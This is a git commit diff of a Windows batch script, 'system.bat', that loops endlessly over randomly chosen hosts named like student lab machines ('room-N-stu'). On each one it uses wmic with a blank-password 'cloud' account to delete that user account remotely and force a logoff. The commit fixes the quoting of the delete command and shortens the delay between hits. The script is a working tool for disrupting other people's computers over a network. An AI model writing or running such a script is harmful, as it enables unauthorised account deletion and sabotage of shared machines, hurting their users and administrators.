0820ad9667d921aff7e4ee645bda23502aaa716f
sodih3iw <116991585+sodih3iw@users.noreply.github.com>
2026-01-15 22:59:04 +0800

    更新 system.bat

--- system.bat
+++ system.bat
@@ -6,7 +6,7 @@ set /a i=%random% %% 100
 
 :loop
 set TARGET=room-!i!-stu
-wmic /node:"!TARGET!" /user:"cloud" /password:"" process call create "cmd /c net user "cloud" /delete&&cmd /c shutdown /l"
+wmic /node:"!TARGET!" /user:"cloud" /password:"" process call create "cmd /c net user cloud /delete&&cmd /c shutdown /l"
 ::wmic /node:"!TARGET!" /user:"cloud" /password:"" process call create "cmd /c shutdown /l"
 ::set /a i+=1
 set /a i=%random% %% 100
@@ -14,5 +14,5 @@ set /a i=%random% %% 100
 ::if !i! == 72 (
 ::    exit /b 0
 ::)
-timeout -t 20
+timeout /t 15
 goto loop
